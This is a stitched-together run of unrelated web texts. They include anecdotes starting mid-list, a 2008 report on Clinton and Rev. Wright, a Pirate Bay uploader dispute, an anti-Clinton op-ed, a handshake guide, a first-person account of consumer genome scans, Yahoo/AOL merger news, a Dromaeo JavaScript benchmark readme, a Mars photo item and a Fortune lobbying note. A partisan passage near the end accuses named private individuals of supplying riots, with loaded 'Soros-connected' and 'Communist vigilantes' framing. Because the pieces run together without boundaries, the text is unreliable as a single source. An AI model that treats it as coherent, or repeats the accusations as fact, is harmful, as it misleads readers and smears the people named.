Does this achievement matter to the families and friends of those 11 people ?
What might have been done differently if the accepted standard was ( like today ) that nobody should die ?
2 . In the mid 1990s , during the peak of the Internet boom , one fellow was working for a promising startup involved in making graphic chips for computers .
One day , during final qualification tests , the fellow noticed that the images on the computer screen often showed a few missing pixels ( empty spaces ) , while similar chips from competitors showed smooth images with no defects .
He recommended against shipping the samples to customers , and asked that the problem be fixed .
The fuming engineering head ( who was also the founder of the company ) walked into this fellow ’s office .
He told this fellow " What do you mean by saying our chip is not good ?
We have the best algorithm on the market .
Do you realize how many man hours we spent on developing it and how many lines of code have been written ? "
Replied the fellow " But we are not selling lines of code and man hours , we are selling the thing that is supposed to create smooth images on the screen . "
A week later , the fellow was released from the company for not having enough technical depth required to understand the complexity of the company 's products .
Sometime later that company , not being able to gain customer acceptance , vanished and was never heard from again .
3 . Some time ago , a very successful executive had announced his retirement after 35 years of an illustrious career .
I went to his office to say goodbye and wish him well .
During our chat , I asked him " What were the most memorable moments of your career ? "
Knowing about his track record and reputation , I was expecting to hear about the number of patents that he had created , how many new products he had introduced , the number of deals he had done , or the amount of money he made to provide financial independence for next few generations .
Instead , to my surprise , he opened a scrapbook .
Inside , there were notes from many people : from all walks of life and from all levels of organizations .
Some were simple sentences and some were a few paragraphs .
All of them were personal : some acknowledging his contributions and many notes of thanks and appreciation for the difference he had made in people 's lives .
During one of the most difficult periods in the presidency of Bill Clinton , he addressed a group of clerics at an annual prayer breakfast in September 1998 just as the Starr report outlining his dalliance with Monica Lewinsky was about to be published .
Among those in attendance , was the Rev. Jeremiah Wright Jr. , who is seen shaking hands with Mr. Clinton in a photograph provided today by the Obama campaign .
Mr. Wright ’s relationship with Senator Barack Obama , as his longtime pastor , has been the subject of considerable controversy in recent days because of incendiary excerpts of sermons Mr. Wright gave at their church , Trinity United Church of Christ , in Chicago .
In providing the photograph to The New York Times , the Obama campaign appeared to be trying to divert some attention to the Clintons after a week in which Mr. Obama ’s relationship with Mr. Wright has left him facing one of the biggest challenges of his campaign .
There is nothing in the picture or the note that addresses whether Mr. Clinton had met Mr. Wright prior to the White House meeting or whether he or Mrs. Clinton knew anything about Mr. Wright ’s views .
Asked for a response tonight through email , Howard Wolfson , a top aide to Senator Hillary Rodham Clinton , wrote , “ Urgent indeed — a picture — oooooooo ! ”
Senator Clinton ’s spokesman , Phil Singer , sent along this reply to a request for comment :
In the course of his two terms in office , Bill Clinton met with , corresponded with and took pictures with literally tens of thousands of people .
Mr. Wright was invited to the 1998 prayer breakfast , and in addition , he received a thank - you note from former President Clinton for his expressions of support about six weeks later .
According to an account by James Bennet , former White House correspondent who has since left The Times :
With tears in his eyes , President Clinton told a roomful of clerics this morning that he had sinned , speaking just hours before the world was presented a painstaking account by prosecutors of when , where and how .
Addressing an annual prayer breakfast at the White House , Mr. Clinton drew on the New Testament , the Yom Kippur liturgy and Ernest Hemingway as he made his most abject confession yet of personal failure , while declaring that he would defend and redeem his Presidency .
” I do n’t think there is a fancy way to say that I have sinned , ” he admitted softly , saying that after resisting expressions of contrition he had reached ” the rock - bottom truth of where I am . ”
For the first time , Mr. Clinton also asked for forgiveness from Monica S. Lewinsky , on the day that the details of their intimate relationship — details that he had denied and struggled to suppress — poured out through the Internet , whose wonders as a tool of communication he has so often extolled .
Mr. Wright is not mentioned in the article .
Also visible in the photograph is Vice President Al Gore .
And according to the newly released schedules of Mrs. Clinton by the National Archives of her years as first lady , she was in attendance , too .
Her schedule reads :
“ Religion Leaders Breakfast ( w/ POTUS ) ” in the East Room from 9 - 10:30 a.m. Format :
– The President and First Lady are announced into the East Room and proceed to their tables .
– The Vice President makes remarks and introduces The President .
– The President makes remarks and introduces Dr. Reverend Gerald Mann .
– Dr. Reverend Gerald Mann gives blessing .
– Breakfast is served .
– Following breakfast , The President opens discussion .
– Upon conclusion of the discussion , The President introduces Dr. Reverend James Forbes .
– Dr. Reverend James Forbes gives benediction .
– The President , First Lady , and Vice President depart .
PARTICIPANTS : Approx . 130 guests to attend .
The wording of Mr. Clinton ’s thank - you note to Mr. Wright , dated Oct. 28 , 1998 :
Sometime during the last 24 hours there was a mass deletion of aXXo torrents from The Pirate Bay 's tracker .
It appears that a dispute between aXXo and The Pirate Bay about how to best handle alleged MPAA torrent meddling got way out of hand - with aXXo deleting lots of his torrents and leaving The Pirate Bay .
An estimated one million people download aXXo rips every month , so although there are conflicting opinions in respect of the quality of his work , there can be no dispute that he ’s very popular indeed .
While some see him in an almost religious light , others have been quick to take advantage of his popularity for nefarious purposes .
Today , aXXo fans visiting his page on The Pirate Bay were in for a shock , summed up this Pirate Bay user :
C01eMaN – 2007-11-07 00:19 CET :
Whats going on with tpb , all of axxo ’s vids are disappearing , any1 ?
One by one , all torrents released after 7th September 2006 were deleted .
But why ?
A message on the Pirate Bay comment section seems to sum up the situation and this version of events has been confirmed by aXXo himself , in a couple of places .
hunter1980 – 2007-11-07 12:23 CET :
************************** NOTE**************************
Since the Piratebay staff does n’t care for their VIP uploaders , then aXXo decided not to use TPB and he deleted his own torrents .
aXXo was constantly exposed to assaults and harassments from possible members of MPAA .
Their strategy was to harass aXXo by posting absurd and accusing comments on aXXo ’s torrents .
The latest assault incident was especially noticed on aXXo ’s last torrent ‘ The Simpsons ’ .
Hunter1980 and aXXo were involved in direct argue with possible members from MPAA .
Unfortunately , this strategy was a success .
The strategy was based on rumors and the intention was to spread rumors and all this have had a negative side effects on naive people ( downloaders ) .
Since PirateBay did not take any action towards ‘ Organized attacks ’ , aXXo decided to delete his torrent on TPB .
aXXo is continuing posting his torrents on mininova or other torrent sites since they care for their VIP uploaders .
***************************END*************************
In a show of protest , Hunter1980 says that he has also deleted all of his torrents from Pirate Bay .
The aXXo world is n’t going to end with the deletion of torrents from The Pirate Bay because they can be found on a number of other torrent sites but it ’s never nice to see disputes in the torrent community , especially between great ‘ brand ’ names .
The deletions have sparked quite a lot of debate on various forums .
Some people are angry at The Pirate Bay for allegedly not giving enough support to aXXo while some are wondering if deleting lots of torrents is an appropriate response .
Others feel that all uploaders should get the same treatment at The Pirate Bay and that aXXo should n’t get special attention .
Maybe the Pirate Bay crew simply do n’t have time to give anyone special treatment ?
Interestingly , not many people seem to be pointing the finger at those who may have made the metaphorical bullets for others to fire – the “ possible members of the MPAA ” deemed to have taken the original actions which ultimately lead to this ( hopefully temporary ) breakdown in communication .
If the original MPAA plan was to reduce the availability of aXXo torrents by taking direct or indirect action against them at The Pirate Bay , that sadly seems to have worked , albeit via a strange turn of events .
Or maybe it ’s nothing to do with the MPAA after all and this is just one big misunderstanding ?
Either way , hopefully this aXXo head will be re-attached to the Pirate Bay section of the BitTorrent hydra before it becomes completely severed .
Undivided , unconquered .
The reason so many people have re-engaged with politics this year is because many sense their country is in a desperate state and because only one candidate has articulated a vision and a politics big enough to address it without dividing the country down the middle again .
For the first time in decades , a candidate has emerged who seems able to address the country 's and the world 's needs with a message that does not rely on Clintonian parsing or Rovian sleaze .
For the first time since the 1960s , we have a potential president able to transcend the victim - mongering identity politics so skillfully used by the Clintons .
If this promise is eclipsed because the old political system conspires to strangle it at birth , the reaction from the new influx of voters will be severe .
The Clintons will all but guarantee they will lose a hefty amount of it in the fall , as they richly deserve to .
Some will gravitate to McCain ; others will be so disillusioned they will withdraw from politics for another generation .
If the Clintons grind up and kill the most promising young leader since Kennedy , and if they do it not on the strength of their arguments , but by the kind of politics we have seen them deploy , the backlash will be deep and severe and long .
As it should be .
He has a million little donors .
He has brought many , many Republicans and Independents to the brink of re-thinking their relationship with the Democratic party .
And he has won the majority of primaries and caucuses and has a majority of the delegates and popular vote .
This has been a staggering achievement - one that has already made campaign history .
If the Clintons , after having already enjoyed presidential power for eight long years , destroy this movement in order to preserve their own grip on privilege and influence in Democratic circles , it will be more than old - fashioned politics .
It will be a generational moment - as formative as 1968 .
Killing it will be remembered for a very , very long time .
And everyone will remember who did it - and why .

Whether you ’re first meeting someone or greeting them for the hundredth time , a good handshake is important .
A strong shake conveys confidence , strength , warmth , honesty , and a host of other good character traits .
The fact that well - executed handshakes create a positive first impression is n’t just anecdotally true , either , but has even been born out by several research studies .
So if you want to learn how to impress compadres and strangers alike , we offer this complete multi-media guide to giving a great handshake .
How to Give a Great Handshake : An AoM Instructional Film
The Full - Text Instructions
Giving a successful and confident handshake boil down to these 3 keys :
How you do it When you do it Where you do it
1. How
Make sure your handshake is firm and not a dead fish grip .
However , you do n’t want to crush the other person ’s hand with a death grip .
Go for the “ web touch . ”
You want the webbing between your thumb and index finger to meet the same spot on the other person ’s hand .
Make sure you do n’t have food or grease on your hands .
You want the person to remember you , not what you ate .
you , not what you ate .
If your hands are sweaty , give them a quick nonchalant wipe on your pants .
When you offer your hand , look the person in the eye and smile .
2 . When
A good handshake requires good timing .
At a party or social event , make sure to shake the host ’s hand when arriving and leaving .
Shake hands with anyone you ’re meeting for the first time , as well friends , family , and acquaintances with whom you do n’t feel close enough for hugging to seem appropriate .
Many people avoid offering handshakes because they ’re afraid of being left hanging .
If you ’re not sure if someone will notice your offer , extend your hand anyways .
Most of the time people will notice your handshake offer and quickly grasp your hand .
So what if you are left hanging ?
I hate when this happens , especially when everyone but the person with whom you were trying to shake hands saw the rejection .
Do n’t feel embarrassed .
The problem is n’t that the other person does n’t think you ’re important , but simply that you ’re timing was off .
Remember the following tips :
Do n’t offer a handshake if the other person is engrossed in conversation with someone else .
Do n’t approach someone from the side with your extended hand .
It ’s hard to see .
Audibly greet the person to get their attention and then offer your hand .
Also be aware of varying social norms .
Most cultures have different customs for when and if to shake hands .
In our culture , for example , you typically want to wait to see if a woman offers her hand first , instead of initiating the shake yourself .
In other cultures , shaking hands with a woman is never appropriate .
Be aware of these and other cultural differences , especially when you travel .
3 . Where
Handshakes are good everywhere !
Make sure to shake plenty of hands when you go to any social gathering , religious function ( again , being sensitive to varying customs ) , family reunion , wedding , etc .
Be liberal with your handshakes , and you ’ll perfect the art in no time .
Your 60 - Second Illustrated Crib Sheet
Hi guys .
i get lots of mails from my friends .
i thought why not compile them into a blog .
So here it is .
i have finally tried to do what i was wishing for long .
MY MATERNAL grandmother had Alzheimer ’s disease .
Before she died , she forgot our names , our faces and , eventually , how to speak and think .
But my grandfather ’s heartbreak was the most painful to witness .
I remember watching the two of them on the sofa together in the months before she died .
My grandfather , a sometimes severe man not overly disposed to expressions of tender emotion , cooed into my grandmother ’s ear : “ My bride , oh my bride .
I love you .
Do you hear me ?
I love you . ”
She just stared down blankly , folding napkins .
That scene was burning in my brain last week when I received an e-mail from a company that offers extensive genome scans directly to the public .
The e-mail told me that my tube of spit had been analyzed and the results were in .
I logged onto my account and began to scan the report for my estimated genetic risk for 17 diseases and conditions .
Breast cancer , colon cancer , Type 2 diabetes : normal .
Strangely relieving .
Obesity : a little above average ( I do not come from thin people ) .
Heart attack , multiple sclerosis , rheumatoid arthritis , macular degeneration : all a little below average .
Even better .
Advertisement
And then there it was , in an orange “ warning ” box on my Web browser : a significantly higher - than - average lifetime risk for late - onset Alzheimer ’s disease , the most common type of this devastating disorder .
The average risk of late - onset Alzheimer ’s is about 17 % .
Mine is 29 % , owing to the DNA letters I carry in a gene called APOE , which contains coding instructions for a protein involved in processing cholesterol .
It comes in different forms , or alleles -- and in my case , one of the copies I carry confers higher risk .
Before I could process a coherent thought , I burst into tears .
Alzheimer ’s might be decades away for me -- I am not yet 30 , and the late - onset disease strikes after 65 -- but that risk allele did n’t pop up in my genome out of nowhere .
In all likelihood it came from my mother , who just turned 60 .
My mother -- who already has high cholesterol , a known risk factor for Alzheimer ’s disease .
I was surprised by my reaction .
It was n’t exactly news , was it ?
Family history alone told me that my mom is at higher risk of Alzheimer ’s just by being her mother ’s daughter .
And the risk is not excessively high ; this is by no means a guarantee that either of us will succumb to the disease .
But something about the plain and simple statement of my own genetic fact seemed shocking and terrifying .

“ Genetic information has a special power , ” says Dr. Robert Green , professor of neurology , genetics and epidemiology at Boston University School of Medicine .
“ It has a feel of fate about it , a sense of inevitability , that sense that , ‘ Oh , you are marked . ’ ”
The test I received was from Redwood Shores , Calif . - based Navigenics , the latest company to offer personalized genome scans directly to consumers .
Its launch last week follows fast on the heels of the Google - backed start - up 23andMe and Iceland ’s deCODEme , which both debuted in November .
The companies , which scan the entire genome for telltale DNA variations linked to traits or diseases , are the splashiest manifestation yet of tests the public can buy to learn their genetic risk for a range of conditions including breast cancer , glaucoma , baldness , more .
Cost of knowing
Advertisement
They do n’t come cheap .
Navigenics charges $ 2,500 , plus a $ 250 yearly fee for scientific updates .
The other two charge about $ 1,000 .
Navigenics justifies its higher price because it offers unlimited genetic counseling .
But the companies say their services offer something precious : the chance for people to take control of their health and destiny .
“ The whole goal here is to tell people whether they are at increased risk so they can do something about it , ” says Dietrich Stephan , Navigenics co-founder ( with Dr. David Agus of the Cedars - Sinai Medical Center ) and a research director at the Translational Genomics Research Institute in Phoenix .
Some scientists agree the tests could carry special behavior - changing clout -- more than a public service message could ever do .
“ The public knows what is good for them .
They could tell you like robots what it is .
But they ’ve become desensitized to it , ” says Colleen McBride , chief of social and behavioral research at the National Human Genome Research Institute .
“ One could argue that genetics is like über - personalization . . . it is reasonable to think that it could get their attention . ”
But many doctors and researchers have voiced concerns over this technology hopping straight from lab bench to Web browser .
They say the science of genomic medicine is in its infancy , yielding research - grade information not yet suitable for public consumption .
And some raise issues of privacy .

Some researchers say it ’s unclear whether people will understand the genetic risk data and what they will do with it .
Is this just a bit of harmless fun ?
Will it improve long - term health outcomes ?
Or will hypochondriacal patients march to their doctors and demand truckloads of unnecessary tests , harming themselves and the healthcare bottom line -- while others incorrectly see their results as destiny and adopt worse lifestyle habits ?
( What ’s one more T - bone if you are fated to die of a heart attack anyhow ? )
“ On the one hand we are excited by technology and its promise , but on the other hand , we want to make sure that the public ’s health does n’t get hurt , ” says Dr. Muin Khoury , director of the National Office of Public Health Genomics at the Centers for Disease Control and Prevention in Atlanta .
No matter how grave the concerns , genetic research is speeding ahead .
Almost every week these days , genetics researchers are coming up with new DNA variations linked to some disease or another .
Some scientists think the information should be available for people to use .
Advertisement
“ I personally started getting very frustrated doing all this research when there was nothing waiting on the other side of the fence waiting to implement it , ” says Stephan , the Navigenics co-founder .
Accessible testing
Now , with the advent of an enormously successful research tool called the genotyping chip , it is finally inexpensive enough to offer these scans to the public ( see accompanying story ) .
Navigenics , 23andMe and deCODEme all use such chips to analyze DNA in spit or cheek swab samples sent in by customers , using them to detect as many as 1 million DNA variations known as SNPs : single nucleotide polymorphisms .
Advertisement
Very few SNPs have been associated with disease , and even fewer still reliably so .
But as science progresses and links more SNPs to diseases , the companies aim to update their databases .
When 23andMe first launched , it offered information on about 20 diseases and traits ( including earwax type and bitter - taste perception ) .
Today , that number is 58 ( deCODEme offers 26 and Navigenics 18 -- 17 each for men and women , including prostate and breast cancer respectively ) .
for On 23andMe ’s website , each disease is listed as either “ Established Research ” -- findings generally confirmed in at least two studies of 1,000 people or more -- or “ Preliminary Research , ” findings that have yet to be repeated and validated .
“ We want to buck the paternalistic attitude , ” 23and Me co-founder Linda Avey says of the company ’s rapid addition of new conditions even when the science is tentative .
“ And if anything , what we are hearing back from our customers is ‘ We want more . ’ ”
Advertisement
In addition , 23andMe and deCODEme give their customers the opportunity to search their raw results -- all those hundreds of thousands of SNPs , and check them for the latest genetics result .
So when a new study is published suggesting that smokers who carry two DNA letter “ T "s at position “ rs1051730 " in the human genome tend to smoke more cigarettes and get more lung cancer -- as was published April 3 in the journal Nature -- customers can head straight to their accounts , type in “ rs1051730 " and see where they fall .
Navigenics has taken a more conservative approach .
If , for example , I want to get my entire genome scan , which I certainly do , I must sign a waiver acknowledging that any of the SNP - disease associations I might Google myself are likely to be spurious .
Only then will the company send me the file on an encrypted disk .
“ We will take responsibility for the information we believe is real , ” Stephan says .
“ For everything else , you can have your genome to play with .
But without our blessing , the potential for misinformation is extremely high . ”
It might not be smart , but I just ca n’t help myself .
I want to know everything .
Advertisement
For the conditions with full reports , there are ample resources to help explore results .
All three companies ’ websites are packed with explanatory graphics , background information , the biology of diseases , links to disease associations and expert medical opinions .
At every turn , the sites try to make clear that risk profiles are estimates , not diagnoses .
“ It is really complicated information in a lot of ways , ” 23andMe co-founder Avey says .
“ That ’s our challenge .
How do we distill this information down and write it in language that everyday people can understand ? ”
The Navigenics site emphasizes strategies to reduce your risk and offers free , unlimited access to genetic counselors to make sure that people understand the ocean of numbers in front of them .
Also , there are tips for talking to your doctor and advice for taking the printouts to an appointment .
My DNA turned up a heightened risk of glaucoma -- almost three times the average .
As it happens , I just got a reminder card in the mail to see my optometrist for a check - up .
Even though genetics plays a very small role in development of the disease , I ’ll be sure to let him know , so he can poke my eye and check for increased pressure .
Why not ?
Do scans help or harm ?
Advertisement
But no amount of transparency , caveats , tutorials or access to genetic counselors can satisfy the concerns of many critics : bioethicists , doctors and health economists who worry that the newness and unreliability of these genetic data make the services , at best , a waste of money and , at worst , a threat to public health .
For one thing , Khoury says , despite the high - tech wizardry of genome scans , most of the advice available so far is just common health sense :
Do n’t smoke , do exercise , eat a healthy diet , maintain a healthy weight , keep your blood pressure and cholesterol in check , and go for your regularly scheduled tests .
What ’s more , most of the risks revealed by these tests are pretty small .
The really potent genetic effects are probably obvious from family history alone .
“ If someone asks me , shall I take [ the test ] , ” Khoury says , “ I would say ‘ No , you do n’t need it .
Tell me about your family history .
If you have a family history of skin cancer , stay away from the sun .
If you have osteoporosis , take calcium supplements . ’
We know what to do . ”
Dr. H. Gilbert Welch , professor of medicine at Dartmouth Medical School , is also wary .
A longtime critic of what he sees as an epidemic of over - diagnosis in the U.S. healthcare system , he thinks genome scans will make matters worse , especially because most doctors have little genetics training .
Advertisement
“ I think a broad - spread application of personalized genetic testing would create havoc and would likely lead to more harm than good , ” he says .
“ It will make people anxious , and it would probably push doctors to more aggressive interventions simply because of lack of information and a feeling they had to do something . ”
Then there ’s the issue of privacy .
In the U.S. , there is still only limited protection from genetic discrimination .
The Genetic Information Nondiscrimination
Act , which would protect individuals against discrimination based on their genetic information when it comes to health insurance and employment , is stalled in the Senate , though it has passed in the House of Representatives .
The Washington , D.C. - based Genetics and Public Policy Center is also pushing for the Food and Drug Administration to regulate consumer genetic testing .
The center ’s director Kathy Hudson says that though these three genome - scanning companies appear scientifically stringent and transparent in their messages , there are no laws to prevent businesses from over - selling results or providing inappropriate tests , as some have done .
Advertisement
Ultimately , it will take extensive research on people receiving genome scans to reveal whether they offer real , long - term health benefits or evidence of harm .
Will learning that a propensity to heart attacks lurks in your DNA finally give that extra push to cut back on the T - bones , take the stairs and finally stop smoking ?
Will knowing that you are loaded with cancer risk alleles hurry you to early screening ?
One such study began last year .
Headed by McBride and Lawrence Brody at the National Human Genome Research Institute , it will offer subjects the opportunity to be tested for eight conditions , including skin , colon and lung cancer ; heart disease ; and Type 2 diabetes .
The team will follow subjects from their earliest interviews all the way to their doctors ’ offices , kitchens and gyms to try and determine who seeks testing and why , if they understand their results and what they do with them .
Navigenics announced Tuesday that it will be partnering with scientists at the Mayo Clinic to study how its customers use the results .

Extra motivation
So what am I going to do ?
I do n’t quite know yet .
Had I seen an increased risk of breast cancer you can bet I ’d be feeling myself up every other Tuesday and pushing for an early start to mammogram screening .
My lifetime estimated risk for obesity is 36 % , just above the population average of 32 % -- a higher risk because I carry two copies of the “ fat gene ” FTO , discovered last April .
Obesity is a risk factor for several diseases -- cancers , heart disease -- so I ’ll work hard to keep my weight within a healthy range , and will probably have to keep working all my life .

Does this genetic information give me the motivation to ride my bike to work and not eat that last cookie ?
Sure .
But did I already have that motivation ?
In spades .
I ’ve told my parents about the Alzheimer ’s results , and I am pushing my mother to talk with her doctor about taking statins to bring down her high cholesterol .
She half - laughs me off because she is already doing lots of the “ right ” things .
She has low blood pressure ; takes multivitamins and folic acid supplements ; eats healthfully , including lots of fish and olive oil ; keeps her mind and body active with knitting , a busy social life and regular exercise .
So maybe I should sit back and chill .
Maybe the statins would hurt her in the long - run .
But when scary orange boxes glare at you from your computer screen , it ’s hard .
You just want to do something .

That is the potential power of these tests .
Whether that power urges us toward healthy change , paranoid medical flailing or nothing at all , is still an open question .
But as private genome scanning companies drive the science of genomic medicine forward , we ’ll find out soon enough .

SAN FRANCISCO ( Reuters ) - Yahoo Inc and Time Warner Inc are “ closing in ” on a deal where Yahoo would merge with Time Warner ’s AOL Internet unit , brushing aside Microsoft ’s bid for Yahoo , a source familiar with the talks said on Wednesday .
The source confirmed a Wall Street Journal story saying Yahoo would receive a cash investment from Time Warner in exchange for a 20 percent stake in the combined Yahoo - AOL business .
The deal would exclude AOL ’s fading dial - up Internet access business and value AOL at about $ 10 billion .
A deal with Time Warner and AOL would be part of a multi- pronged strategy by Yahoo in which it would outsource Web search advertising operations to Google Inc , the source said .
Separately , The New York Times reported that Microsoft and Rupert Murdoch ’s News Corp are in negotiations on making a joint bid for Yahoo .
That merger would join Yahoo , Microsoft Corp ’s MSN and News Corp ’s MySpace , the paper said .

The Dromaeo JavaScript Performance Test Suite .
Named after the Dromaeosaurs - or ' fast lizard ' - and created by John Resig ( jresig at mozilla.com ) .
NOTE :
Dromaeo is currently considered to be a " work in progress . "
It 's been brought forward for review to the other browser vendors and some concerns were raised , namely :
The number of test iterations that are run .
Currently each test is run at least 5 times - it 's been requested that this be increased .
The calculation of error ranges .
Currently the data is fit to a t - distribution , it 's been requested that it use a two - variable t- test .
The quality of the tests .
Currently the tests shown are a subset of the tests presented by SunSpider .
There is no particular choice for these tests , other than that they were ones that originated from the original JavaScript Engine Speeds compilation .
The corpus will likely expand to include all of the SunSpider tests , plus some .
Additionally , the use of closures to encapsulate tests is contested and will probably be revised .
All of these points are currently being worked upon - as a unified JavaScript performance analysis platform is a desired goal by all browser vendors .
How to Use It
Dromaeo : http://dromaeo.com/
Visiting the main Dromaeo page you are given a collection of tests which can be run .
Generally these tests are designed to be more " real world " in nature ( testing a number of features simultaneously ) .
Each test should have a full description explaining what the test is achieving along with an indication of what is being tested .
If you do n't wish to run all of the available tests , and only run a sub-section of them , you can filter tests via the URL , like so :
http://dromaeo.com/?3d ( this will only run 3d - related tests )
http://dromaeo.com/?string ( this will only run String - related tests )
You have full regular expression support so something like the following will work , as well :
http://dromaeo.com/?(3d|string) ( only run 3d or String - related tests )
Running the Tests
To begin you can run the tests by simply hitting the ' Run ' button .
It should be capable of running in Firefox 2+ , Safari 3 + , and Opera 9 + , and Internet Explorer 6 +.
Please report any problems that you may have .
Note : Currently Internet Explorer 6 and 7 run incredibly slow on the DNA sequence test ( taking approximately 15 - 20 minutes ) .
You can pause / resume the tests at any time , using the ' Pause ' button ( it wo n't affect the final numbers ) .
Viewing the Results
After the tests have finished running you 'll be presented with a full breakdown of the tests ( including sub - tests ) .
Each individual sub -test will have its mean value presented in conjunction with an error spread of the results .
Additionally , you 'll be given a URL for your results , saved on the server , which you can refer back to at any point , like the following :
http://dromaeo.com/?id=223
( A single Firefox run . )
Once you 've received a URL ( and associated unique ID ) for your test results you can then use it to compare against other result sets , like so :
http://dromaeo.com/?id=222,223,219
( Compares Safari 3.1 , Firefox 3.0b5 , and Opera 9.5 nightly runs on OSX . )
http://dromaeo.com/?id=232,226,229,237
( Compares Safari 3.1 , Firefox 3.0b5 , Opera 9.5 nightly , and IE 8b1 runs on Windows XP . )
http://dromaeo.com/?id=250,246,251,256,23945
( Compares Safari 3.1 , Firefox 3.0b5 , Opera 9.5 nightly , IE 8b1 , and Google Chrome b1 runs on Windows Vista . )
http://dromaeo.com/?id=234,236,237
( Compares IE 6 , IE 7 , and IE 8 on Windows XP . )
Downloading the Suite
If you wish to run the suite offline you can download it from github .
The result should be identical to the suite running on dromaeo.com .
You 'll need to have PHP support if you wish to save results to the central server .
Adding New Tests
If you have a downloaded copy of the test suite and you wish to add new tests you can do so by adding a JavaScript file into the tests / folder and add an entry into the tests / MANIFEST .
json file .
Methodology
There are a number of techniques that the Dromaeo suite uses in order to achieve accurate results .
Together they provide a solid foundation for allowing significant performance analysis to be completed .
Versioning
All tests have an automatic version number , meaning that when the contents of a test change its results will no longer be used for comparison against other mis-matched results .
This is taken care of , automatically , by the suite .
For example , if you run the the test " 3D Mesh Transformation v115 " and then ( at some point later , after changes ) run " 3D Mesh Transformation v116 " and try to compare the results - no comparison will be allowed .
This is especially important as it allows for a tangible upgrade process to exist , for tests , considering that bugs or adjustments will inevitably arise causing some amount of conflict to occur .
With this being completely baked into the process
Saved Results
All test results are automatically saved to the server and stored in a database for later retrieval and analysis .
This is important for a couple reasons :
Encoding test result data in the URL ( such as via a query string ) is not a scalable solution - and provides too little granularity .
Server - side storage provides limitless information store and can even store additional information to be used later ( such as min , max , and deviation ) .
The simple URLs are easy to pass around are are quickly identifiable .
Simple test IDs make test comparisons trivial for the end user .
This solution is much more scalable , and highly usable , providing a good long - term solution .
Statistical Confidence
A number of checks are put in place to make sure that statistically significant results can be provided to the user .
Some of the techniques used are :
All tests are run , at minimum , 5 times .
If a significant level of error cannot be reached then more runs are completed ( up to 10 ) .
All results are fit on to a T - Distribution , set to a 95 % confidence interval ( values from this table ) .
95 % confident +/- error intervals are provided with all results .
All comparisons between results take into account the error intervals - offering a tie for result sets that are statistically tied within the associated error ranges .
The sum result is a system that 's able to provide consistent results and present them in a fair , and meaningful , way .
Script Speed vs. Rendering Speed
When analyzing JavaScript performance it 's important to make sure that all that you 're testing is just the immediate performance of the script .
Accidentally including factors that can lead to rendering effects can cause slowdowns from unrelated aspects of the browser .
For example , in the SunSpider suite they loaded tests within iFrames , initiating timestamp - logging calls before and after the test completed .
When coalesced updates landed for Firefox 3 a significant performance improvement to the SunSpider results was found - even though the change had absolutely nothing to do with JavaScript performance , only actual rendering speed .
To combat this issue all tests are pre-loaded by the browser and are run on - demand .
This allows for no extra overhead and much more accurate results .
Test Sources
Tests are brought in from a number of locations .
Generally , however , tests are chosen to based upon how complicated they are and how applicable the result is to practical JavaScript code .
The vast majority of the tests are brought in from the Computer Language Shootout and adapted to run within the suite ( often with greater levels of complexity ) .
All the tests in this suite are also capable of running in the JavaScript Engine Speed suite released last year , the results of which can be seen here .
Design and CSS
This site was designed by Allan Branch of Less Everything , the html and css ( of the header area ) was also done by Allan .
Perhaps a better layout for the results can be achieved with the following :
- change the width of result - item class to 20 em ( roughly ) .
- add the property display : inline - block to the result - item class .
- alter the width of the main class or whatever is inhibiting the width , to 100 % or 1000 px ( just for illustration ) .
The results should now flow horizontally over the page width in FF3 .
This is just a crude illustration but I finished the methodology cross browser and it works .
I can include the various details here or provide a link to an example page .
Antifa unloading a U - Haul full of riot supplies , including shields and weapons
Recently , I pointed out that the Antifa groups that attacked the 2017 Unite The Right rally in Charlottesville VA were also key to this summer ’s BLM riots .
Now arrests during the current Breonna Taylor riots in Louisville KY have proved my point : notably Sean Gerwing Liter and his girlfriend Holly McGlawn - Zoller — who was notoriously caught
In a video clip unloading a U - Haul filled with riot supplies [ U - Haul Seen Distributing Shields , Potential Weapons to Louisville Rioters Rented to Holly Zoller of Soros - Connected Louisville Bail Project , by Cassandra Fairbanks , Gateway Pundit , September 23 , 2020 ] — were also caught on camera leading the charge in Charlottesville three years ago .
Had our rulers done their duty , defended UTR ’s civil rights and cracked down on these Communist vigilantes , America would now be a very different country .
Holly McGlawn - Zoller and Sean Gerwing Liter are both co-founders of Louisville Anti-Racist Action , an integral part of the Antifa Torch Network , explicitly known for being “ militant ” ( Louisville Antifa : Inside Two Of The City ’s Most Militant Activist Groups , by Danielle Grady , LEO Weekly , February 19 , 2020 )
Therefore , it is no surprise that Zoller and Liter are involved in the Louisville riots that followed a grand jury indictment against a single police officer over the death of Breonna Taylor .

Liter was arrested on multiple charges stemming from the recent riots in Louisville .
According to Jefferson County court records , he was arraigned on charges of obstructing a highway , disorderly conduct , unlawful assembly , and driving a vehicle with an obstructed windshield .

It 's never miserable on Mars if this picture of smiley face on the planet 's surface is anything to go by .
Perhaps this is finally proof there is life on the red planet and that the Martians enjoy a joke .
These amazing pictures were taken by the Mars Reconnaissance Orbiter , which is on a scientific mission to the planet .
Scroll down for more ...
Experts say this is just a bizarre bump in the landscape and have dismissed wild claims that merry Martians had been up to any high jinx .
The NASA Orbiter took the image on a special high - definition camera and has been studying the planet for signs of water since October 2006 .
The happy face can be seen in a crater 3 km wide in the Nereidum Montes .
The images come just a couple of weeks after a strange figure was spotted stalking the landscapes of the red planet .
The picture caused a stir on the internet as amateur astronomers speculated about the seated figure which appeared to be pointing into the middle distance .
Scroll down for more ...
The photograph was taken by Spirit , Nasa 's Mars explorer vehicle which landed there four years ago .
But again experts feel that it is simply an optical illusion caused by the rocky landscape .
POWER LOBBYING
( FORTUNE Magazine ) – Washington , of course , is about power .
And in our story on Washington 's Power 25 , bureau chief Jeffrey Birnbaum delivers the authoritative taxonomy on the lobbyists who earn their living pressing members of Congress and their staffs to pass , or not pass , the laws that affect all our lives and businesses .
With the help of two respected pollsters -- one Republican and one Democrat -- FORTUNE surveyed hundreds of Washington insiders ( no journalists included ) to get beyond the usual self - promotion and hype and actually quantify the clout of these powerful special interest groups .
Before joining FORTUNE last January , Jeff wrote the book , literally , on lobbying .
He is the author of The Lobbyists , as well as two other books on power and politics .
So , was Jeff surprised by who popped up in the Power 25 ?
Well , yes .
" I knew AARP would come out on top , " he says , " but I would n't have expected AIPAC ( the American Israel Public Affairs Committee ) to be No. 2 . And the Business Roundtable came out much lower than I would have thought [ 33 ] . "
Jeff was heartened by the range of players who dominated our rankings , taking this as further confirmation that this first annual Power 25 truly reflects political reality in the capital today .
Birnbaum also participated in another important FORTUNE Washington event recently , our CEO panel discussion on the subject of global warming and the upcoming summit in Kyoto , Japan , at which Bill Clinton and Al Gore plan to push for the adoption of new global emission standards .
